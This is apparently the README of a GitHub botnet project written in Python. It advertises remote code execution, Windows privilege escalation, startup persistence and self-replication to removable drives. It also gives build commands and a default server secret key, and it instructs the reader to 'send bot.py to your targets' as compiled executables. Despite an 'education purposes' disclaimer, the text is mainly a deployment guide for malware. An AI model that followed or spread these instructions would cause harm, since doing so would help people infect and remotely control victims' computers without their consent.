# Botnet
A simple botnet written 100% in python and distributable to any major OSs on which this will run natively.


## Warning
THIS SOFTWARE WAS CREATED FOR EDUCATION PERPOSES ONLY.

AUTHOR WILL NOT TAKE RESPONSABILITIES OF ANY HARMS AND/OR DAMAGES CAUSED BY THIS SOFTWARE. 
## Features
This botnet has :
1. Remote code execution
2. Acquires Administrator Previleges (Windows)
3. Adds the bot to startup (Windows)
4. Replicates itself to all removable drives (Windows)

## Build Methods
### Windows
Requirements:
* Python 3.6 or higher 
* Git
```cmd
git clone https://github.com/NurTasin/botnet.git
cd botnet
pip install -r requirements.txt
make_all.bat
```
### Linux
Requirements:
* Git
* Python 3.6 or higher
* Python3-pip
```sh
git clone https://github.com/NurTasin/botnet.git
cd botnet
pip install -r requirements.txt
sh make_all.sh
```
### MacOS
> I don't own a mac. So this code is not tested on MacOS.

Requirements:
* Git
* Python 3.6 or higher
* Python3-pip
```sh
git clone https://github.com/NurTasin/botnet.git
cd botnet
pip install -r requirements.txt
sh make_all.sh
```
## Server
DEFAULT_SECRET_KEY: `doyal_baba`

Deploy the server.py file to your cloud provider or on your computer.
After that change the address on bot.py (Line 6) and botctl.py (Line 3).
And you are ready to rock and roll. Just send bot.py to your targets.

## Recommendations 
If you distribute bot.py file then you have to make sure that your target device can run python file...
But it is reccomended to ditribute the compiled binary (*.exe or *.elf or *.dmg). These kinds of files
can be run on any device without dependencies.
